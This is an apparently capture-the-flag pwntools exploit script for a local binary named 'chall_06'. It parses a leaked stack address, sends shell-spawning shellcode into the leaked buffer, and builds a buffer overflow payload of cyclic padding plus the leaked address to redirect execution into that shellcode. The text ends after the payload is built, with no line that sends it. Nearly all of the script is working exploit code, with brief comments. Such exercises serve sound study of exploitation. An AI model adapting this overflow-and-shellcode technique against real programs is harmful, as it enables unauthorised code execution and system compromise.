

from pwn import *
context.arch = "amd64"
p = process("./chall_06")

resp = p.recvuntil(": ")
leak_str = p.recvline().decode('utf-8').strip()
print(leak_str)
leak = int(leak_str, 16)

offset = 0x60 
shellcode = asm(shellcraft.sh())

# The program leaks the address at fgets for var_50h so dropping shell code here when we
# jump back to it.
p.sendline(shellcode)

# this runs during the gets, jumps back to the leaked address which was var_50h back in main.
# Then when it tries to read var_50h the shellcode runs instead.
payload = cyclic(offset - 0x8) + p64(leak) 

